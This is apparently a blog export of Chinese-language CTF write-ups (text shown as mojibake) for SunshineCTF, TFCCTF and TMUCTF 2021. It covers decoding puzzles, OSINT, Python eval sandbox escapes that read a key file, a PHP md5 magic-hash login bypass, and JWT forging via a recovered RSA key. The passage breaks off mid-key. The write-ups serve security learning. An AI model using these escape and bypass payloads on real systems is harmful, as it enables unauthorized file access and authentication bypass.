<h1 id="DownUnder"><a href="#DownUnder" class="headerlink" title="DownUnder"></a>DownUnder</h1><p><em>I mentioned to a friend of mine from Australia that I like the Game Boy Advance. Apparantly, they had a mysterious cartridge they found at a Men At Work concert, and they figured to send it me to figure out what&#39;s on it.</em></p>
<p><em>However, I have no clue why it keeps referencing a &quot;flag.&quot; I ripped it already, but I can&#39;t figure out what it&#39;s about. Can you help me crack this code?</em></p>
<hr>
<p>é¢˜ç›®ä¸­ç»™å‡ºäº†ä¸€ä¸ª<code>Gameboy</code>æ–‡ä»¶,æ”¾åœ¨<a href="https://github.com/visualboyadvance-m/visualboyadvance-m">VisualBoxAdvance</a>é‡Œè¿è¡Œ:</p>
<img data-src="../../CTF/SunshineCTF2021/Misc/assets/DownUnder.png" alt="visual-box" style="zoom:50%;" />

<p>ç‚¹å‡»<code>Tools</code>-&gt;<code>Map Viewer</code>,å‹¾é€‰<code>Stretch to fit</code>,å³å¯ä»¥åœ¨<code>Map</code>çš„åº•éƒ¨çœ‹åˆ°flag</p>
<img data-src="../../CTF/SunshineCTF2021/Misc/assets/DownUnder-Map.png" alt="DownUnder-Map" style="zoom:60%;" />

<p><strong>flag:</strong><code>sun&#123;n1ce_str1ngs_c0mm4nd_but_ch3cc_th3_m@p&#125;</code></p>
<h1 id="ProcrastinatorProgrammer"><a href="#ProcrastinatorProgrammer" class="headerlink" title="ProcrastinatorProgrammer"></a>ProcrastinatorProgrammer</h1><p><em>I may have procrastinated security for <code>procrastinate.chal.2021.sunshinectf.org:65000</code>. I may have been watching too many Tom Cruise movies instead of releasing this... uh... last year.</em></p>
<p><em>But don&#39;t worry! The keys to the kingdom are split into three parts... you&#39;ll never find them all!</em></p>
<p><em>Flag will be given by our backend in the standard <code>sun&#123;&#125;</code> format, but make sure you put all the pieces together!</em></p>
<hr>
<ol>
<li>Part One</li>
</ol>
<pre><code>Welcome to the ProcrastinatorProgrammer backend.
Please give me an equation! Any equation! I need to be fed some data to do some processing!I&#39;m super secure, and can use all python! I just use `eval()` on your data and then whamo, python does all the work!Whatever you do, don&#39;t look at my ./key!

Give me an equation please!
</code></pre>
<p><code>eval()</code>,ä½¿ç”¨<code>open(&#39;key&#39;,&#39;r&#39;).readlines()</code>å¾—åˆ°flagçš„ç¬¬ä¸€éƒ¨åˆ†<code>sun&#123;eval_is</code></p>
<ol start="2">
<li>Part Two</li>
</ol>
<pre><code>Welcome to the ProcrastinatorProgrammer backend.
Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the last challenge, I&#39;ve upped my ante! Now I know it&#39;s secure!I&#39;m super secure, and can use most python math! I just use `eval(client_input, \&#123;\&#125;, safe_math_functions)` on your data and then whamo, python does all the work!Whatever you do, don&#39;t look at my ./key!
   
Halt in the name of the law!
   
What was the ./key found in the previous challenge?
</code></pre>
<p><code>eval(client_input, &#123;&#125;, safe_math_functions)</code>,ä½¿ç”¨<code>__builtins__[&#39;open&#39;](&#39;key&#39;, &#39;r&#39;).read()</code>å¾—åˆ°flagçš„ç¬¬äºŒéƒ¨åˆ†<code>_safe_</code></p>
<ol start="3">
<li>Part Three</li>
</ol>
<pre><code>Welcome to the ProcrastinatorProgrammer backend.
Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the previous set, I had to remove math lib support! In fact the only thing this can do is add and subtract now!... I think. Google tells me that it&#39;s secure now! Well the second result anyhow.I&#39;m super secure, and can use a bit of python math! I just use `eval(client_input, &#123;&#39;__builtins__&#39;:\&#123;\&#125;&#125;)` on your data and then whamo, python does all the work!Whatever you do, don&#39;t look at my ./key!
   
Halt in the name of the law!
   
What was the ./key found in the previous challenge?
</code></pre>
<p><code>eval(client_input, &#123;&#39;__builtins__&#39;:&#123;&#125;&#125;)</code>,ä½¿ç”¨</p>
<pre><code class="python">[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ ==&quot;catch_warnings&quot;][0]()._module.__builtins__[&#39;open&#39;](&#39;key&#39;, &#39;r&#39;).read()
</code></pre>
<p>å¾—åˆ°flagçš„ç¬¬ä¸‰éƒ¨åˆ†<code>only_if_you_ast_whitelist_first&#125;</code></p>
<p><strong>flag:</strong><code>sun&#123;eval_is_safe_only_if_you_ast_whitelist_first&#125;</code></p>
<p>å‚è€ƒæ–‡ç« :</p>
<ul>
<li><a href="http://lybniz2.sourceforge.net/safeeval.html">safe eval</a></li>
<li><a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/">python æ²™ç®±é€ƒé€¸ä¸SSTI</a></li>
</ul>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SunshineCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>TFCCTF2021 Writeup</title>
    <url>/posts/501486646/</url>
    <content><![CDATA[<h1 id="SEA-LANGUAGE-1"><a href="#SEA-LANGUAGE-1" class="headerlink" title="SEA LANGUAGE 1"></a>SEA LANGUAGE 1</h1><p><em>Quick! Help! We are sinking!</em></p>
<p><em>Wrap the result in TFCCTF{}</em></p>
<hr>
<p>çœ‹ç€åƒæ‘©æ–¯ç ,ç›´æ¥åœ¨<a href="https://gchq.github.io/CyberChef/#recipe=From_Morse_Code('Space','Line%20feed')&input=Li0tIC4uLi4gLi4uLi0gLSAtLi4uLi0gLi0gLi0uIC4uLi0tIC0uLi4uLSAtLi0tIC0tLS0tIC4uLSAtLi4uLi0gLi4uIC4tLS0tIC0uIC0uLSAuLS0tLSAtLiAtLS4gLS4uLi4tIC4tIC0uLi4gLS0tLS0gLi4tIC0gLi4tLS4uIC0uLS4tLSAtLi0uLS0gLS4tLi0tIC4uLS0uLgo">gchq.github.io</a>ä¸Šè§£å¯†</p>
<p><img data-src="/../../CTF/TFCCTF2021/Crypto/images/image-20211202204916391.png" alt="image-20211202204916391"></p>
<p><strong>flag:</strong><code>TFCCTF&#123;WH4T-AR3-Y0U-S1NK1NG-AB0UT?!!!?&#125;</code></p>
<h1 id="SEA-LANGUAGE-2"><a href="#SEA-LANGUAGE-2" class="headerlink" title="SEA LANGUAGE? 2"></a>SEA LANGUAGE? 2</h1><p><em>That&#39;s just another way to......</em></p>
<hr>
<p>é¢˜ç›®ç»™çš„æ•°æ®8ä¸ªå­—ç¬¦ä¸ºä¸€ç»„,çŒœæµ‹å¯èƒ½æ˜¯äºŒè¿›åˆ¶,åœ¨<a href="https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Simple%20string','string':'.'%7D,'0',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'_'%7D,'1',true,false,true,false)From_Binary('Space',8)&input=Ll8uXy5fLi4gLl8uLi5fXy4gLl8uLi4uX18gLl8uLi4uX18gLl8uXy5fLi4gLl8uLi5fXy4gLl9fX18uX18gLl9fXy5fX18gLi5fXy5fLi4KIC4uX18uLi5fIC4uX18uX19fIC5fLl9fX19fIC4uX18uXy4uIC5fLl9fX19fIC5fXy5fXy5fIC4uX18uLi5fIC5fXy5fX18uIC5fX18uXy5fCiAuLl9fLl9fXyAuLl9fLi5fXyAuLl8uX19fLiAuLl8uX19fLiAuLl8uX19fLiAuXy5fX19fXyAuLl9fLl9fXyAuX18uXy4uLiAuLl9fLi4uXwogLi5fXy5fLl8gLl8uX19fX18gLi5fXy4uLl8gLl9fXy4uX18gLl8uX19fX18gLl9fLl9fXy4gLi5fXy4uLi4gLi5fXy5fX18gLl8uX19fX18KIC5fXy5fXy5fIC4uX18uLi4uIC5fX18uLl8uIC5fX18uLl9fIC4uX18uLl9fIC4uXy4uLi5fIC4uXy4uLi5fIC4uXy4uLi5fIC4uXy4uLi5fCiAuLl8uLi4uXyAuX19fLi5fLiAuLl9fLi4uXyAuX18uLl9fXyAuX18uXy4uLiAuLl9fLl9fXyAuLl9fX19fXyAuX19fX18uXwo">gchq.github.io</a>å°†<code>.</code>æ›¿æ¢ä¸º<code>0</code>,<code>_</code>æ›¿æ¢ä¸º<code>1</code>,ç„¶åäºŒè¿›åˆ¶è½¬å­—ç¬¦ä¸²</p>
<p><img data-src="/../../CTF/TFCCTF2021/Crypto/images/image-20211202205304755.png" alt="image-20211202205739848"></p>
<p><strong>flag:</strong><code>TFCCTF&#123;w417_4_m1nu73..._7h15_1s_n07_m0rs3!!!!!r1gh7?&#125;</code></p>
<h1 id="AAAAA"><a href="#AAAAA" class="headerlink" title="AAAAA"></a>AAAAA</h1><p><em>AAAAA. That&#39;s all</em></p>
<hr>
<p>é¦–å…ˆç”¨<code>exiftool</code>åˆ†æ,æç¤ºæ–‡ä»¶å‰2000ä¸ªå­—èŠ‚éƒ½æ˜¯A</p>
<pre><code class="shell">~$ exiftool AAAAA
ExifTool Version Number         : 12.31
File Name                       : AAAAA
Directory                       : .
File Size                       : 157 KiB
File Modification Date/Time     : 2021:11:27 00:33:54+08:00
File Access Date/Time           : 2021:11:27 00:35:25+08:00
File Inode Change Date/Time     : 2021:11:27 00:34:19+08:00
File Permissions                : -rw-r--r--
Error                           : First 2000 bytes of file is ASCII &#39;A&#39; characters
</code></pre>
<p><code>hexdump -C AAAAA   </code>å‘ç°æ–‡ä»¶æœ«å°¾çš„å­—èŠ‚ä¹Ÿæœ‰å¾ˆå¤šA,å¹¶ä¸”æ–‡ä»¶åº”è¯¥æ˜¯ä¸€å¼ PNGæ ¼å¼çš„å›¾ç‰‡</p>
<pre><code class="shell">~$ hexdump -C AAAAA | head
00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
*
000007d0  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
000007e0  00 00 07 62 00 00 05 89  08 02 00 00 00 23 47 40  |...b.........#G@|
000007f0  3c 00 00 00 09 70 48 59  73 00 00 2e 23 00 00 2e  |&lt;....pHYs...#...|
00000800  23 01 78 a5 3f 76 00 02  65 2b 49 44 41 54 78 9c  |#.x.?v..e+IDATx.|
00000810  ec bd 67 7b 1a cb da b4  dd 83 10 39 83 50 b6 bd  |..g&#123;.......9.P..|
00000820  c2 de ff ff df dc ef 5e  6b d9 96 ad 48 ce 39 cc  |.......^k...H.9.|
00000830  fb a1 9e a9 e3 12 b2 bd  1c 24 10 50 e7 07 1d 08  |.........$.P....|
00000840  21 18 26 f4 74 57 57 d7  e5 f9 be ef 84 10 42 08  |!.&amp;.tWW.......B.|

~$ hexdump -C AAAAA | tail  
00026cf0  00 00 88 26 13 03 00 00  00 00 44 93 89 01 00 00  |...&amp;......D.....|
00026d00  00 00 a2 c9 c4 00 00 00  00 00 d1 64 62 00 00 00  |...........db...|
00026d10  00 80 68 32 31 00 00 00  00 40 34 99 18 00 00 00  |..h21....@4.....|
00026d20  00 20 9a 4c 0c 00 00 00  00 10 4d 26 06 00 00 00  |. .L......M&amp;....|
00026d30  00 88 f6 7f 00 7a e5 96  20 a3 a9 bd a4 00 00 00  |.....z.. .......|
00026d40  00 49 45 4e 44 ae 42 60  82 41 41 41 41 41 41 41  |.IEND.B`.AAAAAAA|
00026d50  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
*
00027510  41 41 41 41 41 41 41 41  41                       |AAAAAAAAA|
00027519
</code></pre>
<p>å»é™¤æ–‡ä»¶é¦–ä½çš„<code>A</code>å³å¯,ä»£ç :</p>
<pre><code class="python">from pathlib import  Path
p = Path(&#39;AAAAA&#39;)
data = p.read_bytes()
data = data.strip(b&#39;A&#39;)
Path(&#39;a.png&#39;).write_bytes(data)
</code></pre>
<p><img data-src="/../../CTF/TFCCTF2021/Forensics/images/AAAAA.png" alt="AAAAA.png"></p>
<p><strong>flag:</strong><code>TFCCTF&#123;Gr4phic_d35ign_is_my_p455ion&#125;</code></p>
<h1 id="DISCORD-SHENANIGANS"><a href="#DISCORD-SHENANIGANS" class="headerlink" title="DISCORD SHENANIGANS"></a>DISCORD SHENANIGANS</h1><p><em>We considered giving you a free flag. However, we decided against it. In general, we would never do that! Or would we? That&#39;s the beginning of a good CTF! Discord is the new Twitter.</em></p>
<p><em>To be able to solve this challenge, you&#39;ll need to join our discord. Link in the Rules page.</em></p>
<hr>
<p>ç¿»é˜…æ¯”èµ›å®˜æ–¹çš„Discord,å‘ç°<code>#general</code>é¢‘é“æœ‰ä¸€æ¡ç‰¹åˆ«å¥‡æ€ªçš„æ¶ˆæ¯</p>
<p><img data-src="/../../CTF/TFCCTF2021/Misc/images/image-20211203203451799.png" alt="image-20211203203451799"></p>
<p>ä½¿ç”¨<a href="https://holloway.nz/steg/">Twitter Secret Messages</a>è§£å¯†å³å¯</p>
<p><img data-src="/../../CTF/TFCCTF2021/Misc/images/image-20211202215347694.png" alt="image-20211202215347694"></p>
<p><strong>flag:</strong><code>TFCCTF&#123;th1s_5t3g0_fl4g_w45_n0t_h1dden_w3ll&#125;</code></p>
<h1 id="PRETTY-GOOD-PHISHER"><a href="#PRETTY-GOOD-PHISHER" class="headerlink" title="PRETTY GOOD PHISHER"></a>PRETTY GOOD PHISHER</h1><p><em>This phisher thinks he&#39;s the game! We got his PGP Key ID from his phishing e-mail, and we know for sure that he has another PGP key publicized under his real name! Can you find out more about him?</em></p>
<p><em>A2DCB36111E3656B</em></p>
<hr>
<p>é¢˜ç›®ç»™äº†ä¸€ä¸ªäººçš„PGPå¯†é’¥ID,è¦æ±‚æˆ‘ä»¬æ‰¾åˆ°ä»–å¦ä¸€ä¸ªä»¥çœŸåå…¬å¼€çš„PGPå¯†é’¥</p>
<p>åœ¨<a href="https://keyserver.pgp.com/vkd/SubmitSearch.event?SearchCriteria=A2DCB36111E3656B&EmailOrName=3&SearchType=0">https://keyserver.pgp.com/</a>ä¸Šæ£€ç´¢,å¾—åˆ°é‚®ç®±<code>tdgd11fd8@gmail.com</code></p>
<p><img data-src="/../../CTF/TFCCTF2021/Misc/images/image-20211203195242066.png" alt="image-20211203195242066"></p>
<p>åœ¨<a href="https://tools.epieos.com/email.php">OSINT Tool</a>ä¸Šæœç´¢è¯¥é‚®ç®±,å¾—åˆ°ç”¨æˆ·åæ˜¯<code>Theobald Dannie Gyles</code></p>
<img data-src="../../CTF/TFCCTF2021/Misc/images/image-20211203200112827.png" alt="image-20211203200112827" style="zoom:50%;" />

<p>åœ¨<a href="https://keyserver.pgp.com/vkd/SubmitSearch.event">https://keyserver.pgp.com/</a>ä¸Šæœç´¢åŒ…å«è¯¥ç”¨æˆ·åçš„PGPå¯†é’¥,å³å¯å¾—åˆ°flag</p>
<p><img data-src="/../../CTF/TFCCTF2021/Misc/images/image-20211203201556442.png" alt="image-20211203201556442"></p>
<p><strong>flag:</strong><code>TFCCTF&#123;Pee,G...Pee!_w4s_wh4t_th4t_h3_t0ld_m3....!&#125;) </code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>TFCCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>TMUCTF2021 Writeup</title>
    <url>/posts/500717398/</url>
    <content><![CDATA[<h1 id="Puzzle"><a href="#Puzzle" class="headerlink" title="Puzzle"></a>Puzzle</h1><p><em>Life is a puzzle!</em></p>
<hr>
<p>ç»™äº†ä¸€å¼ å›¾ç‰‡,é¦–å…ˆä½¿ç”¨<code>binwalk</code>æå–ä¸€ä¸‹æ–‡ä»¶,å¾—åˆ°ä¸€ä¸ªæœ‰å¯†ç çš„å‹ç¼©æ–‡ä»¶å’Œä¸€å¼ å›¾ç‰‡.</p>
<img data-src="../../CTF/TMUCTF2021/Misc/assets/puzzle.png" style="zoom:40%;" />

<p>è§‚å¯Ÿå›¾ç‰‡å‘ç°,ç¬¬ä¸€ä½æ•°å­—è¡¨ç¤ºè¡Œå·,å‰©ä¸‹çš„æ•°å­—æ˜¯åœ¨æè¿°ä¸Šä¸€è¡Œæ•°å­—çš„ä¸ªæ•°.</p>
<p>ä¾‹å¦‚,ä»12-&gt;11112æ˜¯:å…ˆå†™ä¸€ä¸ª1è¡¨ç¤ºè¡Œå·,ä¸Šä¸€è¡Œæœ‰1ä¸ª1ã€1ä¸ª2,åŠ ä¸Š11å’Œ12å³å¯å¾—åˆ°11112.</p>
<p>ä¾æ¬¡ç±»æ¨,å¾—åˆ°å‹ç¼©åŒ…çš„è§£å‹å¯†ç <code>?</code>æ˜¯<code>61542142311</code>.</p>
<p>è¾“å…¥å¯†ç ,è§£å‹å¾—åˆ°<code>flag.txt</code>:</p>
<p><code>R1pIUEdTe1EzeV9NM19RNDU3NHpfRTRzNzBfVzRhX1U0el9PMV9RM3kwX1c0YV9QdTAwYV9YMGE0en0=</code></p>
<p>base64è§£ç ä¸€ä¸‹:</p>
<p><code>GZHPGS&#123;Q3y_M3_Q4574z_E4s70_W4a_U4z_O1_Q3y0_W4a_Pu00a_X0a4z&#125;</code></p>
<p>ROT13è§£å¯†ä¸€ä¸‹:</p>
<p><code>TMUCTF&#123;D3l_Z3_D4574m_R4f70_J4n_H4m_B1_D3l0_J4n_Ch00n_K0n4m&#125;</code></p>
<p><strong>flag:</strong><code>TMUCTF&#123;D3l_Z3_D4574m_R4f70_J4n_H4m_B1_D3l0_J4n_Ch00n_K0n4m&#125;</code></p>
<h1 id="Too-Much"><a href="#Too-Much" class="headerlink" title="Too Much"></a>Too Much</h1><p><em>I found a program that generates the flag of this challenge, but the implementation of one of its functions is not available. This function seems simple, but I am confused because of the large number of numbers! Can you help me find the flag before the competition is over?!</em></p>
<hr>
<p>é¢˜ç›®ç»™äº†ä¸€ä¸ªåŒ…å«1000000ä¸ªæ•°å­—çš„æ–‡ä»¶<code>numbers.txt</code>,è¦æ±‚ç¼–å†™ä¸€ä¸ªå‡½æ•°:å¯¹äºç»™å®šçš„x,åœ¨<code>numbers.txt</code>ä¸­æ‰¾åˆ°ä¸¤ä¸ªæ•°yå’Œz,è¦æ±‚æ»¡è¶³y !&#x3D; z å’Œ (y + z) &#x3D;&#x3D; x,è¿”å›ä¸é‡å¤çš„(y,z)çš„ä¸ªæ•°.</p>
<p>åˆ©ç”¨å“ˆå¸Œæ•°ç»„çš„æ€æƒ³,å°†æ—¶é—´å¤æ‚åº¦é™åˆ°O(n):</p>
<pre><code class="python">def func2(x):
    &quot;&quot;&quot;
    Returns the number of distinct pairs (y, z) from the numbers in the file &quot;numbers.txt&quot; whose y != z and (y + z) == x
    Note that two pairs (y, z) and (z, y) are considered the same and are counted only once
    &quot;&quot;&quot;
    with open(&#39;numbers.txt&#39;, &#39;r&#39;) as f:
        data = [int(_) for _ in f.readlines()]

    length = max(data) + 1
    hash_arr = [False] * (length)

    for t in data:
        hash_arr[t] = True
    ans = 0
    for y in data:
        z = x-y
        if z &gt; 0 and hash_arr[z]:
            if y != z:
                ans += 1
    print(chr(ans//2))
    return ans // 2

def get_flag(res):
    flag = []
    for i in range(len(res)):
        flag.append(chr(func2(res[i])))
    flag = &#39;&#39;.join(flag)
    return flag

if __name__ == &quot;__main__&quot;:
    res = [751741232, 519127658, 583555720, 3491231752, 3333111256, 481365731, 982100628, 1001121327, 3520999746,
           915725624, 3218509573, 3621224627, 3270950626, 3321456817, 3091205444, 999888800, 475855017, 448213157,
           3222412857, 820711846, 3710211491, 3119823672, 3333211607, 812955676, 971211391, 3210953872, 289789909,
           781213400, 578265122, 910021887, 653886578, 3712776506, 229812345, 582319118, 1111276998, 1151016390,
           700123328, 1074521304, 3210438183, 817210125, 501231350, 753244584, 3240911853, 415234677, 469125436,
           592610671, 612980665, 291821367, 344199617, 1011100412, 681623864, 897219249, 3132267885, 565913000,
           301203203, 3100544737, 432812663, 1012813485, 510928797, 671553831, 3216409218, 3191288433, 698777123,
           3512778698, 810476845, 3102989588, 3621432709, 812321695, 526486561, 378912454, 3316207359, 623111580,
           344209171, 537454826, 691277475, 2634678623, 1112182335, 792111856, 762989676, 666210267, 871278369,
           581009345, 391231132, 921732469, 717217468, 3101412929, 3101217354, 831912337, 532666530, 701012510,
           601365919, 492699680, 2843119525]
    print(&quot;The flag is&quot;, get_flag(res))
</code></pre>
<pre><code>The flag is TMUCTF&#123;r4nd0m_fl46_f0r_fun!_SzC!$JvnbrRh6kc*1@L!4vMueH1k0xKPJem@vh6Y2&amp;Sb2CJzwjnTfU6wVZyePOK3&#125;
</code></pre>
<p><strong>flag:</strong><code>TMUCTF&#123;r4nd0m_fl46_f0r_fun!_SzC!$JvnbrRh6kc*1@L!4vMueH1k0xKPJem@vh6Y2&amp;Sb2CJzwjnTfU6wVZyePOK3&#125;</code></p>
<h1 id="The-Foreign-Student"><a href="#The-Foreign-Student" class="headerlink" title="The Foreign Student"></a>The Foreign Student</h1><p><em>Tarbiat Modares University has a foreign student. His name is Zedmondo. He has a</em> very shady character. He always walks alone, eats alone, and never talks much.There are some rumors about him. Some people say he is a genius sociopath; some say he is just too self-involved. But one thing is obvious; he has a secret.Once, one of the students heard that he was talking about receiving some important documents via a private email. Maybe if we find his email, we can learn about his secret.*</p>
<hr>
<p>é¢˜ç›®æ˜¯è¦æˆ‘ä»¬æ‰¾ä¸€ä¸ªå«<code>Zedmondo</code>çš„å¤§å­¦ç”Ÿçš„<code>private email</code></p>
<p>é¦–å…ˆ,ç”¨Googleæœç´¢<code>Zedmondo Tarbiat Modares University</code>,æ‰¾åˆ°è¿™ä¸ªäººçš„<a href="https://ir.linkedin.com/in/zedmondo-zaberini-203b33206">Linkedinä¸»é¡µ</a></p>
<img data-src="../../CTF/TMUCTF2021/Osint/assets/linkedin.png" alt="Zedmondo é¢†è‹±" style="zoom:80%;" />

<p>é™¤äº†ä¸€ä¸ªGithubé“¾æ¥å¤–(<a href="https://github.com/ZedZini">https://github.com/ZedZini</a>),æ²¡æœ‰ä»€ä¹ˆå…¶ä»–æœ‰ä»·å€¼çš„ä¿¡æ¯</p>
<p>æµè§ˆGithubä¸Šçš„ä»“åº“,ç»“åˆé¢˜ç›®ä¸­çš„<code>he has a secret.</code>,ä¸€ä¸ªä»“åº“<a href="https://github.com/ZedZini/secretkey">https://github.com/ZedZini/secretkey</a>çš„<code>README</code>å¼•èµ·äº†æˆ‘çš„æ³¨æ„.</p>
<pre><code># secretkey
It is a public key. Not really a secret, right?!
</code></pre>
<p>ä¸<code>README</code>ä¸€èµ·çš„è¿˜æœ‰ä¸€ä¸ª<a href="https://github.com/ZedZini/secretkey/blob/main/0xEB0B6528-pub.asc">PGPå…¬é’¥æ–‡ä»¶</a>:</p>
<pre><code>-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: Keybase OpenPGP v1.0.0
Comment: https://keybase.io/crypto

xsFNBGAqSQ8BEADZtFG6grS2QP9afsA7SmT85TpxcSmG5LGLmSHKgI47ZwS+dPrO
SzChR0Jt3vI7BjA3WVlxQp94XTqRqFrjtJkS2I3nO3I94jhLu0AwfoiskKzyl+tQ
...
-----END PGP PUBLIC KEY BLOCK-----
</code></pre>
<p>è®¿é—®<a href="https://keybase.io/crypto">https://keybase.io/crypto</a>,å‘ç°ç½‘ç«™ä¸Šå·²ç»ç»™å‡ºäº†ä½¿ç”¨è¯´æ˜:</p>
<pre><code class="shell">Using the Keybase command line app
keybase pgp encrypt -m &quot;message&quot; [them]
With GPG or another PGP program
You may import from Keybase to GPG easily and then perform whatever cryptographic actions you want.

# using curl
curl https://keybase.io/[them]/key.asc | gpg --import

# using `keybase pgp pull` which
# imports to GPG key chain for you
keybase follow [them]
keybase pgp pull [them]
</code></pre>
<p>å‚ç…§ä½¿ç”¨è¯´æ˜:</p>
<pre><code class="shell">curl https://raw.githubusercontent.com/ZedZini/secretkey/main/0xEB0B6528-pub.asc | gpg --import

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  
gpg: ç›®å½•â€˜/Users/zhaoqi219/.gnupgâ€™å·²åˆ›å»º
gpg: é’¥åŒ™ç®±â€˜/Users/zhaoqi219/.gnupg/pubring.kbxâ€™å·²åˆ›å»º
100  6139  100  6139    0     0   4494      0  0:00:01  0:00:01 --:--:--  4490
gpg: /Users/zhaoqi219/.gnupg/trustdb.gpgï¼šå»ºç«‹äº†ä¿¡ä»»åº¦æ•°æ®åº“
gpg: å¯†é’¥ 586DD615EB0B6528ï¼šå…¬é’¥ â€œZedmondo Zaberini (Nothing to say...) &lt;Z3dm0nd0_Z4b3r1n5k1_15_My_R34l_N4m3@zaberini.com&gt;â€ å·²å¯¼å…¥
gpg: å¤„ç†çš„æ€»æ•°ï¼š1
gpg:               å·²å¯¼å…¥ï¼š1
</code></pre>
<p><strong>flag:</strong> <code>TMUCTF&#123;Z3dm0nd0_Z4b3r1n5k1_15_My_R34l_N4m3@zaberini.com&#125;</code></p>
<h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p><em>Just login and get the flag!</em></p>
<p><em><a href="http://185.235.41.189/">http://185.235.41.189</a></em></p>
<hr>
<p>è®¿é—®<code>/robots.txt</code></p>
<pre><code class="php">if (isset($_GET[&quot;password&quot;])) &#123;
    if (hash(&quot;md5&quot;, $_GET[&quot;password&quot;]) == $_GET[&quot;password&quot;]) &#123;
        echo &quot;&lt;h1&gt;Here is the flag:&lt;/h1&gt;&quot; . $flag;
    &#125; else &#123;
        echo &quot;Try harder!&quot;;
    &#125;
&#125;
</code></pre>
<p><code>==</code>æ˜¯å¼±ç±»å‹çš„æ¯”è¾ƒ,å­—ç¬¦ä¸²åœ¨ä¸æ•°å­—æ¯”è¾ƒå‰ä¼šè‡ªåŠ¨è½¬æ¢ä¸ºæ•°å­—;<code>0e\d+</code>è¿™ç§å­—ç¬¦ä¸²ä¼šè¢«è§£æä¸ºç§‘å­¦è®¡æ•°æ³•çš„æ•°å­—ï¼Œ0çš„å¤šå°‘æ¬¡æ–¹éƒ½æ˜¯é›¶,æ‰€ä»¥<code>oe\d+</code> <code>==</code> <code>oe\d+</code>.</p>
<p>æ‰€ä»¥æˆ‘ä»¬åªè¦æ‰¾åˆ°ä¸€ä¸ªå½¢å¦‚<code>oe\d+</code>ä¸”å“ˆå¸Œåä»ä¸º<code>oe\d+</code>çš„å­—ç¬¦ä¸²å³å¯.</p>
<p>ä»£ç :</p>
<pre><code class="python">import hashlib

i = 0
while True:
    m = hashlib.md5()
    plain = f&#39;0e&#123;i&#125;&#39;
    m.update(plain.encode(&#39;utf-8&#39;))
    t = m.hexdigest()
    if t[:2] == &#39;0e&#39; and t[2:].isdigit():
        print(plain, t)
        break
    i += 1
    if not i % 10000:
        print(i)
</code></pre>
<p><code>md5(&quot;0e215962017&quot;) == &quot;0e291242476940776845150308577824&quot;</code></p>
<p><strong>flag:</strong><code>TMUCTF&#123;D0_y0u_kn0w_7h3_d1ff3r3nc3_b37w33n_L0053_c0mp4r150n_4nd_57r1c7_c0mp4r150n_1n_PHP!?&#125;</code></p>
<h1 id="The-Devil-Never-Sleeps"><a href="#The-Devil-Never-Sleeps" class="headerlink" title="The Devil Never Sleeps"></a>The Devil Never Sleeps</h1><p><em>If you put the devil to sleep, you will get the flag successfully. Unfortunately, the devil never sleeps. But what if you use some sleeping pills?</em></p>
<p><em><a href="http://194.5.207.57:8080/">http://194.5.207.57:8080</a></em></p>
<hr>
<p>è®¿é—®é¢˜ç›®é“¾æ¥</p>
<pre><code>To get sleeping pills, navigate to /sleepingpill. To get the flag, navigate to /flag.
</code></pre>
<p>è®¿é—®<code>/sleepingpill</code>å¾—åˆ°<code>JWT</code>å’Œ<code>Public Key</code>,ä¿å­˜è‡³<code>pub.key</code></p>
<pre><code class="ASN.1">-----BEGIN PUBLIC KEY-----
MIGsMA0GCSqGSIb3DQEBAQUAA4GaADCBlgKBjgD/////////////////////////
/////////////////////////////////////////////////////////////3//
///////////+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAECAwEAAQ==
-----END PUBLIC KEY-----
</code></pre>
<p>è®¿é—®<code>/flag</code></p>
<pre><code class="json">&#123;
   &quot;msg&quot;: &quot;Missing Pill Header&quot;
&#125;
</code></pre>
<p>åŠ ä¸Š<code>Pill</code>è¯•è¯•,å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªæ ‡å‡†çš„<code>JWT</code>æ ¼å¼</p>
<pre><code class="json">&#123;
    &quot;msg&quot;: &quot;Missing &#39;Bearer&#39; type in &#39;Pill&#39; header. Expected &#39;Pill: Bearer &lt;JWT&gt;&#39;&quot;
&#125;
</code></pre>
<p>åœ¨<a href="https://jwt.io/">jwt.io</a>ä¸Šè§£æä¸€ä¸‹<code>JWT</code></p>
<p><img data-src="/../../CTF/TMUCTF2021/Web/assets/jwt-decoded.jpg" alt="jwt"></p>
<p>ä½¿ç”¨<a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool</a>ç”Ÿæˆç§é’¥,ä¿å­˜è‡³<code>private.pem</code></p>
<pre><code class="shell">python RsaCtfTool.py --publickey ./key.pub --private
</code></pre>
<pre><code class="ASN.1">-----BEGIN RSA PRIVATE KEY-----
MIICmwIBAAKBjgD/////////////////////////////////////////////////
/////////////////////////////////////3/////////////+AAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
